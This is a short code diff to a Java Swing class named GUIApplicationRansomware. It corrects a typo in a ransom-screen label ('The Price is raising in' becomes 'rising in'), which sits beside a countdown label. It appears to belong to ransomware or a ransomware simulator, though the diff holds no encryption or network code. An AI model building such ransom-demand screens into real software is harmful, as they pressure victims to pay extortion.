@@ -124,7 +124,7 @@ public class GUIApplicationRansomware extends GUIApplicationWindow{
 
         raisingLabel.setFont(new java.awt.Font("Lucida Grande", 0, 16)); // NOI18N
         raisingLabel.setForeground(new java.awt.Color(255, 255, 255));
-        raisingLabel.setText("The Price is raising in");
+        raisingLabel.setText("The Price is rising in");
 
         raisingCountdownLabel.setFont(new java.awt.Font("Lucida Grande", 0, 24)); // NOI18N
         raisingCountdownLabel.setForeground(new java.awt.Color(255, 255, 255));
